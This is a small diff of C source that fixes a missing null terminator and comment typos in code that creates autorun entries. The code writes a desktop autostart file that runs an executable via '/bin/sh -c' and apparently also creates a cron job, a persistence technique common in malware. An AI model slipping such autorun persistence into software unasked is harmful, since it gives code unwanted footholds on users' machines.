@@ -51,6 +51,7 @@ create_desktop_autostart(const char *executable_path) {
                                     "Terminal=false\n"
                                     "Exec=/bin/sh -c %s\n",
                                     executable_path);
+        data[sizeof data -1] = '\0';
         autorun_file = fopen(file_path, "w");
         if (autorun_file == NULL) {
             return 0;
@@ -103,7 +104,7 @@ create_cron_job(const char *executable_path) {
 
 /*
  * Tries to create a autorun entry point using different methods. If a method
- * succeeds, the fuction returns to prevent creating multiple autoruns of the
+ * succeeds, the function returns to prevent creating multiple autoruns for the
  * same executable
  *
  * Parameters:
